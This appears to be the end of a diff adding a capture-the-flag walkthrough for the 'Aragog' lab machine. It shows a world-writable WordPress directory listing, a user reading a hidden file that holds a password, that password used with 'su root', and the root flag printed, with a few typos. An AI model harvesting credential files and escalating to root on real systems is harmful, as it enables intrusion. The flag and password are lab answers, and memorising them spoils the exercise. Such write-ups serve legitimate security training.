+    drwxrwxrwx 18 cliff    cliff    12288 Nov 22 20:40 wp-includes
+    -rwxrwxrwx  1 cliff    cliff     2422 Nov 22 20:40 wp-links-opml.php
+    -rwxrwxrwx  1 cliff    cliff     3306 Nov 22 20:40 wp-load.php
+    -rwxrwxrwx  1 cliff    cliff    36675 Nov 22 20:42 wp-login.php
+    -rwxrwxrwx  1 cliff    cliff     8048 Nov 22 20:40 wp-mail.php
+    -rwxrwxrwx  1 cliff    cliff    16246 Nov 22 20:40 wp-settings.php
+    -rwxrwxrwx  1 cliff    cliff    30071 Nov 22 20:40 wp-signup.php
+    -rwxrwxrwx  1 cliff    cliff     4620 Nov 22 20:40 wp-trackback.php
+    -rwxrwxrwx  1 cliff    cliff     3065 Nov 22 20:40 xmlrpc.php
+
+florian@aragog:/var/www/html/dev_wiki$ cat .uk47
+Result:
+    :rox
+    :!KRgYs(JFO!&MTr)lf
+
+florian@aragog:/var/www/html/dev_wiki$ su root
+Password: !KRgYs(JFO!&MTr)lf
+Result: root@aragog:/var/www/html/dev_wiki# cat /root/root.txt
+** ROOT ACCESS **
+root@aragog:/var/www/html/dev_wiki# cat /root/root.txt
+Resault: 9a9da52d7aad358699a96a5754595de6
+*** ROOT OWNED ***
+
+*** FINISHED ***
